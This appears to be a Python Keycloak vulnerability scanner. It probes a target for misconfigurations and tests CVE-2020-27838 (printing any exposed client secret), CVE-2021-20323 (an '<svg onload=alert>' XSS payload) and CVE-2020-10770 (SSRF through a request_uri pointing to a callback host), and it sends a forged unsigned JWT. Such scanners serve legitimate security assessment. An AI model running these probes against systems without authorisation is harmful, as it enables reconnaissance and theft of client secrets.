import sys
import requests
import socket
import re
import json
import argparse
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings()

# Handle Ctrl+C interruption
def signal_handler(sig, frame):
    print("\n[!] Interrupted by user. Exiting...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Parse command line arguments
parser = argparse.ArgumentParser(description='Keycloak Security Scanner')
parser.add_argument('base_url', help='Keycloak Base URL (e.g., https://example.com)')
parser.add_argument('realm', help='Realm name to test')
parser.add_argument('--threads', type=int, default=10, help='Number of threads for parallel testing (default: 10)')
parser.add_argument('--timeout', type=int, default=10, help='Connection timeout in seconds (default: 10)')
parser.add_argument('--verify', action='store_true', help='Verify SSL certificates')
parser.add_argument('--only-basic', action='store_true', help='Run only basic security checks')
parser.add_argument('--hook', help='Callback URL for SSRF testing (required for CVE-2020-10770)')
parser.add_argument('--realms-file', help='File containing realm names to test')
parser.add_argument('--include-ssrf', action='store_true', help='Include SSRF test (requires --hook parameter)')

args_group = parser.add_argument_group('Test Selection')
args_group.add_argument('--basic-checks', action='store_true', help='Run basic security checks')
args_group.add_argument('--cve-2020-27838', action='store_true', help='Test for CVE-2020-27838 (Secret Exposure)')
args_group.add_argument('--cve-2021-20323', action='store_true', help='Test for CVE-2021-20323 (XSS Vulnerability)')
args_group.add_argument('--cve-2020-10770', action='store_true', help='Test for CVE-2020-10770 (SSRF Vulnerability)')

args = parser.parse_args()

# Handle arguments logic
base_url = args.base_url.rstrip('/')
default_realm = args.realm
timeout = args.timeout
num_threads = args.threads  # Store the thread count

# Handle realms list from file if provided
realms = [default_realm]
if args.realms_file:
    try:
        with open(args.realms_file, 'r') as f:
            realms = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(realms)} realms from {args.realms_file}")
    except Exception as e:
        print(f"[!] Error loading realms file: {e}")
        sys.exit(1)

print(f"[+] Starting Keycloak security check on {base_url} for realm(s): {', '.join(realms[:5])}{' and more...' if len(realms) > 5 else ''}")

session = requests.Session()
session.verify = args.verify
timeout = args.timeout

# Common utility functions
def safe_request(method, url, **kwargs):
    """Execute a request with error handling"""
    try:
        kwargs.setdefault('timeout', timeout)
        if method.lower() == 'get':
            return session.get(url, **kwargs)
        elif method.lower() == 'post':
            return session.post(url, **kwargs)
        else:
            print(f"[!] Unsupported method: {method}")
            return None
    except requests.exceptions.Timeout:
        print(f"[!] Request timeout for URL: {url}")
        return None
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection error for URL: {url}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error for URL {url}: {e}")
        return None

def safe_json_parse(response):
    """Safely parse JSON response"""
    if not response:
        return None
    
    try:
        if 'application/json' in response.headers.get('Content-Type', ''):
            return response.json()
        else:
            return None
    except json.JSONDecodeError:
        print(f"[!] Failed to parse JSON response from {response.url}")
        return None

# Original security checks
def check_admin_console(realm):
    url = f"{base_url}/admin/"
    print(f"[*] Checking admin console accessibility: {url}")
    res = safe_request('get', url, allow_redirects=False)
    if not res:
        return None
    
    if res.status_code in (200, 302):
        return f"[!] Admin console is accessible externally at {url}. Restrict access or firewall this interface."
    return None

def detect_h2_db(realm):
    url = f"{base_url}/console/"
    print(f"[*] Checking for H2 Database Console: {url}")
    res = safe_request('get', url)
    if not res:
        return None
    
    try:
        if "H2 Console" in res.text or res.status_code == 200:
            return f"[!] Detected H2 Database Console at {url}. Migrate to a production-grade DB and disable H2 console immediately."
    except AttributeError:
        print(f"[!] Error processing response content from {url}")
    return None

def direct_grant_check(realm):
    url = f"{base_url}/realms/{realm}/protocol/openid-connect/token"
    print(f"[*] Checking direct grant endpoint for realm {realm}: {url}")
    data = {
        "grant_type": "password",
        "client_id": "account",
        "username": "test_invalid_user",
        "password": "invalid_pass"
    }
    
    res = safe_request('post', url, data=data)
    if not res:
        return None
    
    json_response = safe_json_parse(res)
    
    if json_response:
        if res.status_code == 400 and json_response.get('error') in ['unauthorized_client', 'invalid_grant', 'invalid_client']:
            return f"[+] Direct grants endpoint at {url} correctly restricted (HTTP {res.status_code})."
        elif res.status_code == 401:
            return f"[i] Direct grants at {url} explicitly unauthorized (401)."
        else:
            return f"[!] Unexpected response from direct grant endpoint {url} ({res.status_code}): Review configuration!"
    else:
        return f"[!] Non-JSON response from direct grant endpoint {url} ({res.status_code}): Possibly misconfigured or blocked by firewall."
    return None

def jwt_none_algorithm(realm):
    config_url = f"{base_url}/realms/{realm}/.well-known/openid-configuration"
    print(f"[*] Checking JWT 'none' algorithm vulnerability for realm {realm}")
    print(f"[*] Retrieving OpenID configuration from: {config_url}")
    
    res = safe_request('get', config_url)
    if not res:
        print(f"[!] Failed to fetch OpenID configuration from {config_url}")
        return None
    
    config = safe_json_parse(res)
    if not config:
        print(f"[!] Failed to parse OpenID configuration from {config_url}")
        return None
    
    userinfo_url = f"{base_url}/realms/{realm}/protocol/openid-connect/userinfo"
    fake_token = "eyJhbGciOiJub25lIn0.eyJzdWIiOiJmYWtlVXNlciJ9."
    
    print(f"[*] Testing JWT 'none' algorithm at: {userinfo_url}")
    res = safe_request('get', userinfo_url, headers={"Authorization": f"Bearer {fake_token}"})
    if not res:
        return None
    
    if res.status_code != 401:
        return f"[!] JWT tokens with 'none' algorithm are accepted at {userinfo_url}. CRITICAL vulnerability!"
    return None

def client_enum(realm):
    common_clients = ["admin-cli", "account", "security-admin-console", "broker"]
    found_clients = []
    
    print(f"[*] Checking for client enumeration vulnerability for realm {realm}")
    for client in common_clients:
        auth_url = f"{base_url}/realms/{realm}/protocol/openid-connect/auth?client_id={client}&response_type=code&redirect_uri=http://localhost"
        res = safe_request('get', auth_url)
        if not res:
            continue
        
        try:
            if res.status_code == 200 and "Invalid parameter: redirect_uri" not in res.text:
                found_clients.append(client)
                print(f"[i] Found client: {client} at {auth_url}")
        except AttributeError:
            print(f"[!] Error processing response for client {client}")
    
    if found_clients:
        return f"[!] Enumerated common/default clients for realm {realm}: {', '.join(found_clients)}. Consider disabling unused clients."
    return None

def check_redirect_uri(realm):
    client_config_url = f"{base_url}/realms/{realm}/clients-registrations/default/"
    print(f"[*] Checking client registration endpoint for realm {realm}: {client_config_url}")
    
    res = safe_request('get', client_config_url)
    if not res:
        return None
    
    if res.status_code == 401:
        return f"[i] Client registration endpoint at {client_config_url} requires authentication. Skipping redirect URI check."
    else:
        try:
            if '*' in res.text or '/*' in res.text:
                return f"[!] Insecure wildcard patterns found in redirect URIs at {client_config_url}. Tighten these patterns immediately."
        except AttributeError:
            print(f"[!] Error processing response from {client_config_url}")
    return None

def logout_and_revocation(realm):
    logout_url = f"{base_url}/realms/{realm}/protocol/openid-connect/logout"
    print(f"[*] Checking logout endpoint for realm {realm}: {logout_url}")
    
    res = safe_request('get', logout_url)
    if not res:
        return None
    
    if res.status_code not in (400, 405):
        return f"[i] Logout endpoint accessible at {logout_url} (status {res.status_code}). Verify proper session invalidation."
    else:
        return f"[i] Logout endpoint at {logout_url} appears protected from unauthenticated access."
    return None

def realm_enumeration(realm):
    random_realm = "nonexistentreallyfake"
    test_url = f"{base_url}/realms/{random_realm}"
    print(f"[*] Checking for realm enumeration vulnerability: {test_url}")
    
    res = safe_request('get', test_url)
    if not res:
        return None
    
    if res.status_code == 404:
        return f"[i] Realm enumeration might be possible at {test_url}, as unknown realm returned 404 explicitly."
    elif res.status_code == 200:
        return f"[!] Non-existent realm returned 200 at {test_url}. Critical misconfiguration allowing easy realm enumeration."
    return None

def open_ports_check(realm):
    host = urlparse(base_url).hostname
    ports = [9990, 9993, 8009]
    results = []
    print(f"[*] Checking for open management ports on {host}")
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            if result == 0:
                results.append(f"[!] Sensitive management/AJP port {port} open on {host}. Restrict or firewall this port.")
        except socket.error as e:
            print(f"[!] Socket error when checking port {port} on {host}: {e}")
        finally:
            sock.close()
    
    return results if results else None

def self_registration_check(realm):
    url = f"{base_url}/realms/{realm}/protocol/openid-connect/registrations"
    print(f"[*] Checking self-registration for realm {realm}: {url}")
    
    res = safe_request('get', url)
    if not res:
        return None
    
    if res.status_code == 200:
        return f"[!] Self-registration is enabled at {url}. Disable if not explicitly required."
    return None

# New security checks from Keycloak-Sniper
def check_cve_2020_27838(realm):
    """Check for CVE-2020-27838 (Secret exposure vulnerability)"""
    url = f"{base_url}/realms/{realm}/clients-registrations/default/security-admin-console"
    print(f"[*] Testing CVE-2020-27838 (Secret exposure) for realm {realm}: {url}")
    
    res = safe_request('get', url)
    if not res:
        return None
    
    if res.status_code == 200:
        json_data = safe_json_parse(res)
        if json_data and 'secret' in json_data:
            secret = json_data.get('secret')
            # Ignore masked secrets
            if secret and (secret == "**********" or all(char == '*' for char in secret)):
                return None
            return f"[!] CVE-2020-27838: Client secret exposed at {url}. Secret: {secret}"
    return None

def check_cve_2021_20323_openid(realm):
    """Check for CVE-2021-20323 (XSS vulnerability in openid-connect endpoint)"""
    url = f"{base_url}/realms/{realm}/clients-registrations/openid-connect"
    print(f"[*] Testing CVE-2021-20323 (XSS) openid-connect for realm {realm}: {url}")
    
    data = {"<svg onload=alert('XSS-Test')>": 1}
    res = safe_request('post', url, json=data)
    if not res:
        return None
    
    try:
        if re.search(r'Unrecognized field "<svg onload=alert\(', res.text):
            return f"[!] CVE-2021-20323: XSS vulnerability in openid-connect endpoint at {url}"
    except AttributeError:
        print(f"[!] Error processing response from {url}")
    return None

def check_cve_2021_20323_default(realm):
    """Check for CVE-2021-20323 (XSS vulnerability in default endpoint)"""
    url = f"{base_url}/realms/{realm}/clients-registrations/default"
    print(f"[*] Testing CVE-2021-20323 (XSS) default endpoint for realm {realm}: {url}")
    
    data = {"<svg onload=alert('XSS-Test')>": 1}
    res = safe_request('post', url, json=data)
    if not res:
        return None
    
    try:
        if re.search(r'Unrecognized field "<svg onload=alert\(', res.text):
            return f"[!] CVE-2021-20323: XSS vulnerability in default endpoint at {url}"
    except AttributeError:
        print(f"[!] Error processing response from {url}")
    return None

def check_cve_2020_10770(realm, hook):
    """Check for CVE-2020-10770 (SSRF vulnerability)"""
    if not hook:
        print("[!] Hook parameter is required for CVE-2020-10770 testing")
        return None
    
    url = f"{base_url}/realms/{realm}/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{hook}"
    print(f"[*] Testing CVE-2020-10770 (SSRF) for realm {realm}: {url}")
    
    res = safe_request('get', url)
    return f"[i] Request sent for CVE-2020-10770 (SSRF) test to {url}. Check your server logs for callback."

# Multithreaded execution function
def run_tests_in_parallel(realms, test_func, *extra_args):
    results = []
    with ThreadPoolExecutor(max_workers=num_threads) as executor:  # Using num_threads instead of args.threads
        future_to_realm = {executor.submit(test_func, realm, *extra_args): realm for realm in realms}
        for future in as_completed(future_to_realm):
            realm = future_to_realm[future]
            try:
                result = future.result()
                if result:
                    if isinstance(result, list):
                        results.extend(result)
                    else:
                        results.append(result)
            except Exception as e:
                print(f"[!] Error during test for realm {realm}: {e}")
    return results

# Determine which tests to run
def run_all_tests():
    all_results = []
    
    # Always run realm-independent checks
    admin_result = check_admin_console(default_realm)
    if admin_result:
        print(admin_result)
        all_results.append(admin_result)
    
    h2db_result = detect_h2_db(default_realm)
    if h2db_result:
        print(h2db_result)
        all_results.append(h2db_result)
        
    # Run realm-specific checks in parallel
    if args.basic_checks or not args.only_basic:
        print("\n[+] Running basic security checks...")
        tests = [
            direct_grant_check,
            jwt_none_algorithm,
            client_enum,
            check_redirect_uri,
            logout_and_revocation,
            realm_enumeration,
            self_registration_check
        ]
        
        for test_func in tests:
            results = run_tests_in_parallel(realms, test_func)
            for result in results:
                print(result)
            all_results.extend(results)
    
    # Open ports check (realm-independent)
    ports_results = open_ports_check(default_realm)
    if ports_results:
        for result in ports_results:
            print(result)
        all_results.extend(ports_results)
    
    # CVE checks - By default run all except SSRF unless specifically requested
    if not args.only_basic:
        # Check for CVE-2020-27838 unless only basic checks requested
        if args.cve_2020_27838 or not args.only_basic:
            print("\n[+] Checking for CVE-2020-27838 (Secret exposure)...")
            results = run_tests_in_parallel(realms, check_cve_2020_27838)
            for result in results:
                print(result)
            all_results.extend(results)
        
        # Check for CVE-2021-20323 unless only basic checks requested
        if args.cve_2021_20323 or not args.only_basic:
            print("\n[+] Checking for CVE-2021-20323 (XSS vulnerabilities)...")
            results = run_tests_in_parallel(realms, check_cve_2021_20323_openid)
            for result in results:
                print(result)
            all_results.extend(results)
            
            results = run_tests_in_parallel(realms, check_cve_2021_20323_default)
            for result in results:
                print(result)
            all_results.extend(results)
        
        # Only check for SSRF if explicitly requested and hook is provided
        if args.cve_2020_10770 or args.include_ssrf:
            if not args.hook:
                print("[!] Hook parameter is required for CVE-2020-10770 testing")
            else:
                print("\n[+] Checking for CVE-2020-10770 (SSRF vulnerability)...")
                results = run_tests_in_parallel(realms, check_cve_2020_10770, args.hook)
                for result in results:
                    print(result)
                all_results.extend(results)
    
    return all_results

try:
    # Default behavior: run all tests except SSRF
    # Logic has been adjusted to default to running everything except SSRF test
    
    # Execute all selected tests
    all_results = run_all_tests()
    
    # Print summary
    print("\n[+] Testing completed.")
    if all_results:
        print(f"[!] Found {len(all_results)} potential issues or findings.")
    else:
        print("[+] No issues found.")
    
except Exception as e:
    print(f"[!] An unexpected error occurred during the security check: {e}")
    import traceback
    traceback.print_exc()  # Print the full stack trace for better debugging
    sys.exit(1)

